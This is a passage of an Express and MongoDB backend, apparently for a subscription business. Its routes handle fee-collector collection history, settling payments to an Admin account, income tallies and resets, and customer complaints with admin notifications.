    console.error('Error fetching transfer history:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching transfer history',
      error: error.message
    });
  }
});

// GET collection history for a specific fee collector
app.get('/api/collections/history/:feeCollector', ensureDbConnection, async (req, res) => {
  try {
    const feeCollectorName = req.params.feeCollector;
    const page = req.query.page ? parseInt(req.query.page) : null;
    const limit = req.query.limit ? parseInt(req.query.limit) : 20;
    const search = req.query.search ? req.query.search.trim() : '';

    if (!feeCollectorName) {
      return res.status(400).json({
        success: false,
        message: 'Fee collector name is required'
      });
    }

    console.log(`📜 Fetching collection history for: ${feeCollectorName} (Page: ${page || 'All'}, Limit: ${limit})`);

    const vouchersCollection = db.collection('vouchers');
    const feeCollectorLower = feeCollectorName.toLowerCase().trim();

    // Query vouchers matching receivedBy in months, paymentHistory, or root level
    const escapedName = feeCollectorLower.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const nameRegex = new RegExp(`^${escapedName}$`, 'i');

    const matchingVouchers = await vouchersCollection.find({
      $or: [
        { 'months.receivedBy': nameRegex },
        { 'months.paymentHistory.receivedBy': nameRegex },
        { 'paymentHistory.receivedBy': nameRegex },
        { 'receivedBy': nameRegex }
      ]
    }).toArray();

    let collectionHistory = [];

    // Process matching vouchers to extract individual payment items
    matchingVouchers.forEach(voucher => {
      const userName = voucher.userName || voucher.name || voucher.user || 'Unknown Customer';
      const voucherId = voucher._id ? voucher._id.toString() : '';

      // Multi-month vouchers
      if (voucher.months && Array.isArray(voucher.months)) {
        voucher.months.forEach(month => {
          if (['paid', 'partial'].includes(month.status) && month.receivedBy && !month.isSettled) {
            const receivedByLower = month.receivedBy.toLowerCase().trim();
            if (receivedByLower !== 'myself' && receivedByLower === feeCollectorLower) {
              const paidAmount = Number(month.paidAmount || 0);
              if (paidAmount > 0) {
                collectionHistory.push({
                  voucherId,
                  userName: userName,
                  amount: paidAmount,
                  date: month.paymentDate || month.paidDate || month.date || month.createdAt || voucher.createdAt || new Date(),
                  paymentMethod: month.paymentMethod || 'Cash',
                  month: month.month || 'Unknown Month',
                  isSettled: false
                });
              }
            }
          }
        });
      }
      // Single-month vouchers
      else if (['paid', 'partial'].includes(voucher.status) && !voucher.isSettled) {
        const receivedBy = voucher.receivedBy || '';
        const receivedByLower = receivedBy.toLowerCase().trim();
        if (receivedByLower !== 'myself' && receivedByLower === feeCollectorLower) {
          const paidAmount = Number(voucher.paidAmount || 0);
          if (paidAmount > 0) {
            collectionHistory.push({
              voucherId,
              userName: userName,
              amount: paidAmount,
              date: voucher.paymentDate || voucher.paidDate || voucher.date || voucher.createdAt || new Date(),
              paymentMethod: voucher.paymentMethod || 'Cash',
              isSettled: false
            });
          }
        }
      }

      // Check paymentHistory array
      if (voucher.paymentHistory && Array.isArray(voucher.paymentHistory)) {
        voucher.paymentHistory.forEach(payment => {
          if (payment.isSettled) return;
          const receivedByLower = (payment.receivedBy || '').toLowerCase().trim();
          if (receivedByLower !== 'myself' && receivedByLower === feeCollectorLower) {
            const paidAmount = Number(payment.amount || 0);
            if (paidAmount > 0) {
              collectionHistory.push({
                voucherId,
                userName: userName,
                amount: paidAmount,
                date: payment.date || voucher.createdAt || new Date(),
                paymentMethod: payment.paymentMethod || 'Cash',
                month: payment.month || 'Unknown Month',
                isSettled: false
              });
            }
          }
        });
      }
    });

    // Deduplicate records to avoid identical entries
    const uniqueRecordsMap = new Map();
    collectionHistory.forEach(rec => {
      const dateStr = rec.date ? new Date(rec.date).toISOString().split('T')[0] : '';
      const key = `${rec.voucherId}_${rec.userName}_${rec.month || ''}_${rec.amount}_${dateStr}`;
      if (!uniqueRecordsMap.has(key)) {
        uniqueRecordsMap.set(key, rec);
      }
    });
    collectionHistory = Array.from(uniqueRecordsMap.values());

    // Search filter
    if (search) {
      const sRegex = new RegExp(search.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i');
      collectionHistory = collectionHistory.filter(r => sRegex.test(r.userName));
    }

    // Sort descending by date
    collectionHistory.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());

    const totalCount = collectionHistory.length;
    const totalAmount = collectionHistory.reduce((sum, r) => sum + r.amount, 0);

    let resultData = collectionHistory;
    let hasMore = false;

    if (page !== null && page > 0) {
      const skip = (page - 1) * limit;
      resultData = collectionHistory.slice(skip, skip + limit);
      hasMore = skip + limit < totalCount;
    }

    res.status(200).json({
      success: true,
      data: resultData,
      totalCount,
      totalAmount,
      page: page || 1,
      limit: limit,
      hasMore
    });
  } catch (error) {
    console.error('❌ Error fetching collection history:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching collection history',
      error: error.message
    });
  }
});

// POST - Settle individual customer payment (Mark as paid/transferred to Admin by Technician)
app.post('/api/collections/settle-payment', ensureDbConnection, async (req, res) => {
  try {
    const { feeCollector, voucherId, month, userName, amount } = req.body;

    if (!feeCollector || !amount || Number(amount) <= 0) {
      return res.status(400).json({ success: false, message: 'feeCollector and valid amount are required' });
    }

    console.log(`🤝 Settling payment: ${userName || 'Customer'} (Rs ${amount}) by ${feeCollector}`);

    const vouchersCollection = db.collection('vouchers');
    const incomesCollection = db.collection('incomes');
    const collectionsCollection = db.collection('collections');
    const transactionsCollection = db.collection('transactions');

    const feeCollectorTrimmed = feeCollector.trim();
    const settleAmount = Number(amount);

    // 1. If voucherId & month provided, mark as settled in voucher
    if (voucherId && ObjectId.isValid(voucherId)) {
      const vObjectId = new ObjectId(voucherId);
      const voucher = await vouchersCollection.findOne({ _id: vObjectId });

      if (voucher) {
        if (voucher.months && Array.isArray(voucher.months)) {
          const updatedMonths = voucher.months.map(m => {
            if (!month || m.month === month) {
              return { ...m, isSettled: true, settledAt: new Date(), settledBy: feeCollectorTrimmed };
            }
            return m;
          });

          await vouchersCollection.updateOne(
            { _id: vObjectId },
            { $set: { months: updatedMonths, updatedAt: new Date() } }
          );
        } else {
          await vouchersCollection.updateOne(
            { _id: vObjectId },
            { $set: { isSettled: true, settledAt: new Date(), settledBy: feeCollectorTrimmed, updatedAt: new Date() } }
          );
        }
      }
    }

    // 2. Transfer cash income from Fee Collector / Technician to Admin
    const collectorRegex = new RegExp(`^${feeCollectorTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');

    await incomesCollection.updateOne(
      { name: collectorRegex },
      { $inc: { cashIncome: -settleAmount }, $set: { lastUpdated: new Date() } }
    );

    await incomesCollection.updateOne(
      { name: { $regex: new RegExp(`^Admin$`, 'i') } },
      { $inc: { cashIncome: settleAmount }, $set: { lastUpdated: new Date() } },
      { upsert: true }
    );

    // 3. Save transfer record in collections
    const transferRecord = {
      feeCollector: feeCollectorTrimmed,
      amount: settleAmount,
      message: `Fee paid to Admin for customer ${userName || 'Customer'}${month ? ` (${month})` : ''}`,
      date: new Date(),
      createdAt: new Date(),
      settledVoucherId: voucherId || null,
      settledMonth: month || null
    };
    await collectionsCollection.insertOne(transferRecord);

    // 4. Save transaction log
    await transactionsCollection.insertOne({
      type: 'transfer',
      feeCollector: feeCollectorTrimmed,
      amount: settleAmount,
      description: `Settled payment for ${userName || 'Customer'}`,
      date: new Date(),
      createdAt: new Date()
    });

    console.log(`✅ Payment settled successfully for ${userName} by ${feeCollectorTrimmed}`);

    res.status(200).json({
      success: true,
      message: 'Payment marked as paid and transferred to Admin'
    });
  } catch (error) {
    console.error('❌ Error settling payment:', error);
    res.status(500).json({ success: false, message: 'Error settling payment', error: error.message });
  }
});

// ==================== INCOMES API ====================

// GET all incomes
app.get('/api/incomes', ensureDbConnection, async (req, res) => {
  try {
    const incomes = await incomesCollection.find({}).sort({ name: 1 }).toArray();

    res.status(200).json({
      success: true,
      data: incomes
    });
  } catch (error) {
    console.error('Error fetching incomes:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching incomes',
      error: error.message
    });
  }
});

// GET income for a specific person
app.get('/api/incomes/:name', ensureDbConnection, async (req, res) => {
  try {
    const name = req.params.name;

    // Use case-insensitive search to match transfer endpoint logic
    const income = await incomesCollection.findOne({
      name: { $regex: new RegExp(`^${name.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
    });

    if (!income) {
      return res.status(404).json({
        success: false,
        message: 'Income record not found',
        data: { name, cashIncome: 0, bankIncome: 0 }
      });
    }

    res.status(200).json({
      success: true,
      data: income
    });
  } catch (error) {
    console.error('Error fetching income:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching income',
      error: error.message
    });
  }
});

// POST /api/incomes/reset - Reset Admin's cashIncome and bankIncome to 0
// MANUAL ONLY - called from Settings > Admin Tools > Reset Income button
app.post('/api/incomes/reset', ensureDbConnection, async (req, res) => {
  try {
    const { resetMonth } = req.body; // e.g. "March 2026"
    console.log(`🔄 Income reset requested for month: ${resetMonth || 'manual'}`);

    const adminIncome = await incomesCollection.findOne({
      name: { $regex: new RegExp(`^Admin$`, 'i') }
    });

    const previousCash = adminIncome?.cashIncome || 0;
    const previousBank = adminIncome?.bankIncome || 0;

    if (adminIncome) {
      await incomesCollection.updateOne(
        { name: { $regex: new RegExp(`^Admin$`, 'i') } },
        {
          $set: {
            cashIncome: 0,
            bankIncome: 0,
            lastResetAt: new Date(),
            lastResetMonth: resetMonth || null,
            lastUpdated: new Date()
          }
        }
      );
    } else {
      await incomesCollection.insertOne({
        name: 'Admin',
        cashIncome: 0,
        bankIncome: 0,
        lastResetAt: new Date(),
        lastResetMonth: resetMonth || null,
        createdAt: new Date(),
        lastUpdated: new Date()
      });
    }

    console.log(`✅ Admin income reset: Cash ${previousCash} → 0, Bank ${previousBank} → 0`);

    res.status(200).json({
      success: true,
      message: 'Admin income reset successfully',
      data: { previousCash, previousBank }
    });
  } catch (error) {
    console.error('Error resetting income:', error);
    res.status(500).json({ success: false, message: 'Failed to reset income', error: error.message });
  }
});

// GET Admin Overall Income Report (with date range filter)
// This calculates:
// 1. Total transferred from fee collectors to Admin (from collections)
// 2. Admin's direct bank income (receivedBy=Admin, paymentMethod=Bank)
// 3. Admin's direct cash income (receivedBy=Admin, paymentMethod=Cash)
app.get('/api/incomes/admin/report', ensureDbConnection, async (req, res) => {
  try {
    const { fromDate, toDate } = req.query;

    if (!fromDate || !toDate) {
      return res.status(400).json({
        success: false,
        message: 'fromDate and toDate are required (format: YYYY-MM-DD)'
      });
    }

    console.log(`📊 Admin Income Report: ${fromDate} to ${toDate}`);

    // Parse dates - set time to start/end of day in PKT
    const startDate = new Date(fromDate + 'T00:00:00+05:00');
    const endDate = new Date(toDate + 'T23:59:59+05:00');

    console.log(`📅 Date range: ${startDate.toISOString()} to ${endDate.toISOString()}`);

    // 1. Get transferred amount from fee collectors (from collections)
    const collectionsCollection = db.collection('collections');
    const transfers = await collectionsCollection.find({
      date: {
        $gte: startDate,
        $lte: endDate
      }
    }).toArray();

    let transferredFromEmployees = 0;
    const transferDetails = [];

    transfers.forEach(transfer => {
      const amount = Number(transfer.amount || 0);
      transferredFromEmployees += amount;
      transferDetails.push({
        feeCollector: transfer.feeCollector,
        amount: amount,
        date: transfer.date,
        message: transfer.message || ''
      });
    });

    console.log(`💰 Transferred from employees: Rs ${transferredFromEmployees} (${transfers.length} transfers)`);

    // 2. Get direct Admin income from vouchers (receivedBy = Admin or Myself)
    const vouchersCollection = db.collection('vouchers');
    const allVouchers = await vouchersCollection.find({}).toArray();

    let adminCashIncome = 0;
    let adminBankIncome = 0;
    const paymentDetails = [];

    allVouchers.forEach(voucher => {
      if (voucher.months && Array.isArray(voucher.months)) {
        voucher.months.forEach(month => {
          const paymentHistory = Array.isArray(month.paymentHistory) ? month.paymentHistory : [];

          paymentHistory.forEach(payment => {
            const paymentReceivedBy = (payment.receivedBy || '').trim();
            const paymentMethod = (payment.paymentMethod || '').trim().toLowerCase();
            const paymentAmount = Number(payment.amount || 0);
            const paymentDate = payment.date ? new Date(payment.date) : null;

            // Check if payment is by Admin or Myself
            const isAdminPayment = /^admin$/i.test(paymentReceivedBy) || /^myself$/i.test(paymentReceivedBy);

            // Check if payment is within date range
            const isWithinDateRange = paymentDate && paymentDate >= startDate && paymentDate <= endDate;

            if (isAdminPayment && isWithinDateRange && paymentAmount > 0) {
              if (paymentMethod === 'cash') {
                adminCashIncome += paymentAmount;
              } else if (paymentMethod === 'bank' || paymentMethod === 'bank transfer') {
                adminBankIncome += paymentAmount;
              } else {
                // Default to cash if payment method not specified
                adminCashIncome += paymentAmount;
              }

              paymentDetails.push({
                userName: voucher.userName || 'Unknown',
                amount: paymentAmount,
                method: paymentMethod || 'cash',
                date: paymentDate,
                month: month.month
              });
            }
          });
        });
      }
    });

    console.log(`💵 Admin direct cash income: Rs ${adminCashIncome}`);
    console.log(`🏦 Admin direct bank income: Rs ${adminBankIncome}`);

    // Calculate totals
    const totalIncome = transferredFromEmployees + adminCashIncome + adminBankIncome;

    res.status(200).json({
      success: true,
      data: {
        dateRange: {
          from: fromDate,
          to: toDate
        },
        transferredFromEmployees: transferredFromEmployees,
        adminCashIncome: adminCashIncome,
        adminBankIncome: adminBankIncome,
        totalIncome: totalIncome,
        transferCount: transfers.length,
        transferDetails: transferDetails,
        paymentDetails: paymentDetails
      }
    });
  } catch (error) {
    console.error('Error fetching admin income report:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching admin income report',
      error: error.message
    });
  }
});

// POST - Add income when payment is received
app.post('/api/incomes', ensureDbConnection, async (req, res) => {
  try {
    const { receivedBy, amount, paymentMethod } = req.body;

    if (!receivedBy || !amount || amount <= 0) {
      return res.status(400).json({
        success: false,
        message: 'receivedBy and valid amount are required'
      });
    }

    console.log(`💰 Adding income: ${receivedBy} - Rs ${amount} (${paymentMethod || 'Cash'})`);

    // CRITICAL: Income storage logic based on who receives payment:
    // - Employee: ALWAYS cashIncome (regardless of payment method Cash/Bank)
    // - Admin: Cash → cashIncome, Bank → bankIncome

    const receivedByTrimmed = receivedBy.trim();
    const isAdmin = receivedByTrimmed.toLowerCase() === 'admin' || receivedByTrimmed.toLowerCase() === 'myself';

    // Determine which field to update
    let updateField = 'cashIncome';
    if (isAdmin) {
      // Admin: respect payment method
      const isCash = !paymentMethod || paymentMethod === 'Cash' || paymentMethod === 'cash';
      updateField = isCash ? 'cashIncome' : 'bankIncome';
    } else {
      // Employee: always cashIncome
      updateField = 'cashIncome';
    }

    // Check if income record exists for this person
    const existingIncome = await incomesCollection.findOne({
      name: { $regex: new RegExp(`^${receivedByTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
    });

    if (existingIncome) {
      // Update existing income
      await incomesCollection.updateOne(
        { name: { $regex: new RegExp(`^${receivedByTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') } },
        {
          $inc: { [updateField]: amount },
          $set: { lastUpdated: new Date() }
        }
      );
      console.log(`💰 Updated income for ${receivedBy}: ${updateField === 'cashIncome' ? 'Cash' : 'Bank'} +Rs ${amount}`);
    } else {
      // Create new income record
      const newIncome = {
        name: receivedByTrimmed,
        cashIncome: updateField === 'cashIncome' ? amount : 0,
        bankIncome: updateField === 'bankIncome' ? amount : 0,
        createdAt: new Date(),
        lastUpdated: new Date()
      };
      await incomesCollection.insertOne(newIncome);
      console.log(`💰 Created new income record for ${receivedBy}: ${updateField === 'cashIncome' ? 'Cash' : 'Bank'} Rs ${amount}`);
    }

    // Get updated income record
    const updatedIncome = await incomesCollection.findOne({
      name: { $regex: new RegExp(`^${receivedByTrimmed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
    });

    res.status(200).json({
      success: true,
      message: 'Income updated successfully',
      data: updatedIncome
    });
  } catch (error) {
    console.error('Error adding income:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding income',
      error: error.message
    });
  }
});

// POST - Update income manually (for admin to change technician income)
app.post('/api/incomes/update', ensureDbConnection, async (req, res) => {
  try {
    const { name, cashIncome, fromName } = req.body;

    if (!name) {
      return res.status(400).json({
        success: false,
        message: 'Name is required'
      });
    }

    const incomeValue = Number(cashIncome || 0);
    const sourceName = fromName ? fromName.trim() : 'Unknown';

    // Find existing income record
    const existingIncome = await incomesCollection.findOne({ name: name });

    if (incomeValue === 0) {
      console.log(`💰 Resetting income for ${name} to 0`);
      if (existingIncome) {
        await incomesCollection.updateOne(
          { name: name },
          {
            $set: {
              cashIncome: 0,
              incomeRecords: [],
              updatedAt: new Date()
            }
          }
        );
      }
      return res.status(200).json({
        success: true,
        message: `Income reset for ${name}`,
        data: { name, cashIncome: 0 }
      });
    } else {
      console.log(`💰 Adding Rs ${incomeValue} to income of ${name} from ${sourceName}`);
      const newTotal = existingIncome ? (existingIncome.cashIncome || 0) + incomeValue : incomeValue;
      const newRecord = { fromName: sourceName, amount: incomeValue, date: new Date() };

      if (existingIncome) {
        await incomesCollection.updateOne(
          { name: name },
          {
            $set: {
              cashIncome: newTotal,
              updatedAt: new Date()
            },
            $push: { incomeRecords: newRecord }
          }
        );
      } else {
        await incomesCollection.insertOne({
          name: name,
          cashIncome: newTotal,
          bankIncome: 0,
          incomeRecords: [newRecord],
          createdAt: new Date(),
          updatedAt: new Date()
        });
      }
      return res.status(200).json({
        success: true,
        message: `Added Rs ${incomeValue} to ${name}`,
        data: { name, cashIncome: newTotal }
      });
    }
  } catch (error) {
    console.error('❌ Error updating income:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating income',
      error: error.message
    });
  }
});

// GET - Get income history for a specific employee
app.get('/api/incomes/history/:name', ensureDbConnection, async (req, res) => {
  try {
    const name = req.params.name;
    // Handle URL encoded names and case insensitivity
    const existingIncome = await incomesCollection.findOne({ name: { $regex: new RegExp(`^${name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') } });

    if (!existingIncome) {
      return res.status(200).json({
        success: true,
        data: { name: name, cashIncome: 0, bankIncome: 0, incomeRecords: [] }
      });
    }

    res.status(200).json({
      success: true,
      data: existingIncome
    });
  } catch (error) {
    console.error('❌ Error fetching employee income:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching income',
      error: error.message
    });
  }
});

// DELETE - Delete a specific income record and deduct amount from total
app.post('/api/incomes/delete-record', ensureDbConnection, async (req, res) => {
  try {
    const { name, recordIndex } = req.body;

    if (!name || recordIndex === undefined) {
      return res.status(400).json({ success: false, message: 'Name and recordIndex are required' });
    }

    const existingIncome = await incomesCollection.findOne({ name: name });

    if (!existingIncome || !existingIncome.incomeRecords || !existingIncome.incomeRecords[recordIndex]) {
      return res.status(404).json({ success: false, message: 'Record not found' });
    }

    const amountToDeduct = Number(existingIncome.incomeRecords[recordIndex].amount || 0);
    const updatedRecords = [...existingIncome.incomeRecords];
    updatedRecords.splice(recordIndex, 1);

    const updatedTotal = Math.max(0, (existingIncome.cashIncome || 0) - amountToDeduct);

    await incomesCollection.updateOne(
      { name: name },
      {
        $set: {
          cashIncome: updatedTotal,
          incomeRecords: updatedRecords,
          updatedAt: new Date()
        }
      }
    );

    res.status(200).json({
      success: true,
      message: 'Record deleted and income updated',
      data: { cashIncome: updatedTotal }
    });
  } catch (error) {
    console.error('❌ Error deleting income record:', error);
    res.status(500).json({ success: false, message: 'Error deleting record' });
  }
});

// POST - Sync incomes from existing vouchers (one-time initialization)
app.post('/api/incomes/sync', ensureDbConnection, async (req, res) => {
  try {
    console.log('💰 Starting income sync from existing vouchers...');

    // Clear existing incomes (fresh start)
    await incomesCollection.deleteMany({});
    console.log('💰 Cleared existing incomes');

    // Get all vouchers
    const vouchers = await vouchersCollection.find({}).toArray();
    console.log(`💰 Found ${vouchers.length} vouchers to process`);

    let totalProcessed = 0;
    const incomeMap = {}; // Temporary map to accumulate incomes

    // Process each voucher
    for (const voucher of vouchers) {
      if (voucher.months && Array.isArray(voucher.months)) {
        for (const month of voucher.months) {
          if (month.status === 'paid' || month.status === 'partial') {
            const paymentHistory = month.paymentHistory || [];

            if (paymentHistory.length > 0) {
              // New structure: Process each payment in history
              for (const payment of paymentHistory) {
                const receiver = payment.receivedBy || 'Admin';
                const amount = parseFloat(payment.amount) || 0;

                if (amount > 0) {
                  if (!incomeMap[receiver]) {
                    incomeMap[receiver] = 0;
                  }
                  incomeMap[receiver] += amount;
                  totalProcessed++;
                }
              }
            } else if (month.receivedBy) {
              // Old structure: Single receivedBy field
              const receiver = month.receivedBy;
              const amount = parseFloat(month.paidAmount) || 0;

              if (amount > 0) {
                if (!incomeMap[receiver]) {
                  incomeMap[receiver] = 0;
                }
                incomeMap[receiver] += amount;
                totalProcessed++;
              }
            }
          }
        }
      }
    }

    // Insert accumulated incomes into collection (ONLY cashIncome)
    const incomeRecords = Object.entries(incomeMap).map(([name, cashIncome]) => ({
      name,
      cashIncome,
      createdAt: new Date(),
      lastUpdated: new Date()
    }));

    if (incomeRecords.length > 0) {
      await incomesCollection.insertMany(incomeRecords);
      console.log(`💰 Inserted ${incomeRecords.length} income records`);
    }

    // Subtract transferred amounts from fee collectors (ONLY cashIncome)
    const collectionsCollection = db.collection('collections');
    const transfers = await collectionsCollection.find({}).toArray();

    for (const transfer of transfers) {
      const feeCollector = transfer.feeCollector?.trim();
      const amount = Number(transfer.amount || 0);

      if (feeCollector && amount > 0) {
        // Decrease fee collector's cashIncome
        await incomesCollection.updateOne(
          { name: feeCollector },
          {
            $inc: { cashIncome: -amount },
            $set: { lastUpdated: new Date() }
          }
        );

        // Increase Admin's cashIncome
        await incomesCollection.updateOne(
          { name: 'Admin' },
          {
            $inc: { cashIncome: amount },
            $set: { lastUpdated: new Date() },
            $setOnInsert: { name: 'Admin', createdAt: new Date() }
          },
          { upsert: true }
        );
      }
    }

    console.log(`💰 Processed ${transfers.length} transfers`);

    // Get final incomes
    const finalIncomes = await incomesCollection.find({}).sort({ cashIncome: -1 }).toArray();

    res.status(200).json({
      success: true,
      message: 'Income sync completed successfully',
      data: {
        totalPaymentsProcessed: totalProcessed,
        totalTransfersProcessed: transfers.length,
        incomeRecords: finalIncomes
      }
    });
  } catch (error) {
    console.error('Error syncing incomes:', error);
    res.status(500).json({
      success: false,
      message: 'Error syncing incomes',
      error: error.message
    });
  }
});

// ==================== COMPLAINTS API ====================

// POST - Create a new complaint
app.post('/api/complaints', ensureDbConnection, async (req, res) => {
  try {
    const { userId, userName, message, assignTo, simNo, whatsappNo, reportedBy } = req.body;

    if (!userId || !userName || !message || !message.trim()) {
      return res.status(400).json({
        success: false,
        message: 'User ID, user name, and message are required'
      });
    }

    // Create or get complaints collection
    let complaintsCollection = db.collection('complaints');

    // Check if collection exists, if not create it
    const collections = await db.listCollections().toArray();
    const collectionExists = collections.some(c => c.name === 'complaints');
    if (!collectionExists) {
      await db.createCollection('complaints');
      complaintsCollection = db.collection('complaints');
    }

    // Create complaint record
    const complaintRecord = {
      userId: userId,
      userName: userName.trim(),
      message: message.trim(),
      assignTo: assignTo ? assignTo.trim() : null,
      simNo: simNo || null,
      whatsappNo: whatsappNo || null,
      reportedBy: reportedBy ? reportedBy.trim() : null, // Who reported: admin or fee collector name
      status: 'pending', // pending, resolved
      createdAt: new Date(),
      updatedAt: new Date()
    };

    const result = await complaintsCollection.insertOne(complaintRecord);

    console.log(`📝 Complaint created: ${userName} - ${message.substring(0, 50)}...`);

    // Create notification for admin if complaint is not submitted by admin
    if (reportedBy && reportedBy.toLowerCase() !== 'admin') {
      try {
        await notificationsCollection.insertOne({
          type: 'new_complaint',
          title: 'New Complaint Received',
          message: `${reportedBy} submitted a complaint from ${userName}`,
          complaintId: result.insertedId.toString(),
          userName: userName.trim(),
          complaintMessage: message.trim(),
          submittedBy: reportedBy.trim(),
          isRead: false,
          createdAt: new Date()
        });
        console.log('✅ Notification created for admin');
      } catch (notifError) {
        console.error('Error creating notification:', notifError);
      }
    }

    res.status(200).json({
      success: true,
      message: 'Complaint submitted successfully',
      data: {
        _id: result.insertedId,
        ...complaintRecord
      }
    });
  } catch (error) {
    console.error('Error creating complaint:', error);
    res.status(500).json({
      success: false,
      message: 'Error creating complaint',
      error: error.message
    });
  }
});

// GET - Get all complaints (with optional filters)
app.get('/api/complaints', ensureDbConnection, async (req, res) => {
  try {
    const technician = req.query.technician; // Filter by assigned technician
    const status = req.query.status; // Filter by status (pending, resolved)
    const reportedBy = req.query.reportedBy; // Filter by who reported (fee collector name)
    const role = req.query.role; // User role: admin, fee collector, technician
    const search = req.query.search; // Search by name or phone number
    const page = parseInt(req.query.page) || 1; // Page number (default: 1)
    const limit = parseInt(req.query.limit) || 20; // Items per page (default: 20)

    const complaintsCollection = db.collection('complaints');

    // Build query
    const query = {};
    if (technician) {
      query.assignTo = { $regex: new RegExp(`^${technician.trim()}$`, 'i') };
    }
    if (status) {
      query.status = status.toLowerCase();
    }
    // For fee collector: show only complaints they reported
    if (role === 'fee collector' && reportedBy) {
      query.reportedBy = { $regex: new RegExp(`^${reportedBy.trim()}$`, 'i') };
    }

    // Apply search filter to query if provided
    if (search && search.trim() !== '') {
      const searchTerm = search.trim();
      query.$or = [
        { userName: { $regex: searchTerm, $options: 'i' } },
        { message: { $regex: searchTerm, $options: 'i' } },
        { simNo: { $regex: searchTerm, $options: 'i' } },
        { whatsappNo: { $regex: searchTerm, $options: 'i' } }
      ];
    }

    // Calculate skip value for pagination
    const skip = (page - 1) * limit;

    // Get total count for pagination
    const totalCount = await complaintsCollection.countDocuments(query);

    // Get complaints with pagination, sorted by date (newest first)
    const complaints = await complaintsCollection
      .find(query)
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(limit)
      .toArray();

    // Format complaints
    const formattedComplaints = complaints.map((complaint) => ({
      _id: complaint._id,
      userId: complaint.userId,
      userName: complaint.userName || '',
      message: complaint.message || '',
      assignTo: complaint.assignTo || null,
      simNo: complaint.simNo || null,
      whatsappNo: complaint.whatsappNo || null,
      reportedBy: complaint.reportedBy || null,
      status: complaint.status || 'pending',
      createdAt: complaint.createdAt,
      updatedAt: complaint.updatedAt || complaint.createdAt
    }));

    res.status(200).json({
      success: true,
      data: formattedComplaints,
      count: formattedComplaints.length,
      total: totalCount,
      page: page,
      totalPages: Math.ceil(totalCount / limit),
      hasMore: skip + formattedComplaints.length < totalCount
    });
  } catch (error) {
    console.error('❌ Error fetching complaints:', error);
    console.error('❌ Error stack:', error.stack);

    // Ensure we always return valid JSON
    try {
      res.status(500).json({
        success: false,
        message: 'Error fetching complaints',
        error: error.message || 'Unknown error'
      });
    } catch (jsonError) {
      // If JSON response fails, send plain text (shouldn't happen, but safety)
      console.error('❌ Failed to send JSON error response:', jsonError);
      res.status(500).send(`Error: ${error.message || 'Unknown error'}`);
    }
  }
});

// GET - Get complaint statistics for a technician
app.get('/api/complaints/stats', ensureDbConnection, async (req, res) => {
  try {
    const technician = req.query.technician;

    if (!technician) {
      return res.status(400).json({
        success: false,
        message: 'Technician name is required'
      });
    }

    const complaintsCollection = db.collection('complaints');

    // Get all complaints for this technician
    const complaints = await complaintsCollection.find({
      assignTo: { $regex: new RegExp(`^${technician.trim()}$`, 'i') }
    }).toArray();

    // Calculate stats
    const pending = complaints.filter(c => (c.status || 'pending').toLowerCase() === 'pending').length;
    const resolved = complaints.filter(c => (c.status || 'pending').toLowerCase() === 'resolved').length;
    const total = complaints.length;

    res.status(200).json({
      success: true,
      data: {
        total,
        pending,
        resolved
      }
    });
  } catch (error) {
    console.error('Error fetching complaint stats:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching complaint statistics',
      error: error.message
    });
  }
});

// PUT - Update complaint status
app.put('/api/complaints/:id/status', ensureDbConnection, async (req, res) => {
  try {
    const complaintId = req.params.id;
    const { status, resolvedBy } = req.body;

    if (!complaintId) {
      return res.status(400).json({
        success: false,
        message: 'Complaint ID is required'
      });
    }

    if (!status || !['pending', 'resolved'].includes(status.toLowerCase())) {
      return res.status(400).json({
        success: false,
        message: 'Status must be either "pending" or "resolved"'
      });
    }

    const complaintsCollection = db.collection('complaints');

    // Get complaint details first for notification
    const complaint = await complaintsCollection.findOne({ _id: new ObjectId(complaintId) });

    if (!complaint) {
      return res.status(404).json({
        success: false,
        message: 'Complaint not found'
      });
    }

    // Update complaint status
    const result = await complaintsCollection.updateOne(
      { _id: new ObjectId(complaintId) },
      {
        $set: {
          status: status.toLowerCase(),
          updatedAt: new Date()
        }
      }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Complaint not found'
      });
    }

    // CRITICAL: Create notification for admin when complaint is resolved
    // Check if status was changed from pending to resolved AND resolver is not admin
    const wasResolved = complaint.status && complaint.status.toLowerCase() === 'resolved';
    const isNowResolved = status.toLowerCase() === 'resolved';
    const resolver = resolvedBy || complaint.assignTo || complaint.reportedBy || 'Unknown';
    const isResolverAdmin = resolver.toLowerCase().includes('admin');

    console.log('📊 Notification check:', {
      complaintId,
      wasResolved,
      isNowResolved,
      resolver,
      isResolverAdmin,
      shouldCreateNotification: !wasResolved && isNowResolved && !isResolverAdmin
    });

    // Create notification if: complaint is being marked as resolved (not already resolved) AND resolver is not admin
    if (!wasResolved && isNowResolved && !isResolverAdmin) {
      try {
        const notificationData = {
          type: 'complaint_resolved',
          title: 'Complaint Resolved',
          message: `${resolver} resolved complaint from ${complaint.userName}`,
          complaintId: complaintId,
          userName: complaint.userName,
          userId: complaint.userId,
          whatsappNo: complaint.whatsappNo || null,
          simNo: complaint.simNo || null,
          complaintMessage: complaint.message,
          resolvedBy: resolver,
          isRead: false,
          createdAt: new Date()
        };

        await notificationsCollection.insertOne(notificationData);
        console.log(`✅ Notification created for admin (complaint resolved by ${resolver})`);
        console.log('📧 Notification data:', notificationData);
      } catch (notifError) {
        console.error('❌ Error creating notification:', notifError);
      }
    } else {
      console.log('⏭️ Skipping notification creation');
    }

    console.log(`✅ Complaint ${complaintId} status updated to ${status}`);

    res.status(200).json({
